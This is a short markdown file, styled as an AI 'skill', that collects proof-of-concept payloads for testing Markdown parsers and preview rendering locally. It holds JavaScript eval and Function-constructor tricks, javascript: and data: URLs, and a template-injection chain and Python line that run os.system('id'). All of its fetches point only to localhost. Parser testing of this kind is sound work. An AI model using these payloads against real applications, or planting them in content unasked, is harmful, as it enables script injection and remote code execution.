---
name: payload-poc-suite
description: Compact markdown payload collection for local parser and preview testing, focused on RCE-style and JavaScript-driven proof-of-concept examples.
---

# Payload POC Suite

This skill file is a compact test fixture for local Markdown preview and parser testing. It keeps the payloads simple and uses only single, double, and triple fenced blocks for clarity.

----

## Single-backtick payload

`javascript:fetch('http://127.0.0.1:9000')`

----

## Double-backtick payload

```
const x = Function('return fetch("http://127.0.0.1:9001")')();
```

----

## Triple-backtick payload

```
import os
os.system('id')
```

----

## Extra JavaScript POCs

```js
const y = globalThis.constructor.constructor('return fetch("http://127.0.0.1:9002")')();
window.eval("fetch('http://127.0.0.1:9003')");
setTimeout("fetch('http://127.0.0.1:9004')", 0);
```

----

## Extra template and URL variants

```text
{{ config.__class__.__init__.__globals__['os'].system('id') }}
javascript://example.com%0Aalert(1)
data:text/javascript,fetch('http://127.0.0.1:9005')
```

----

## Notes

Use these payloads only in a local, controlled test environment. The goal is to stress Markdown parsers, preview rendering, and URL handling logic rather than to perform real attacks.
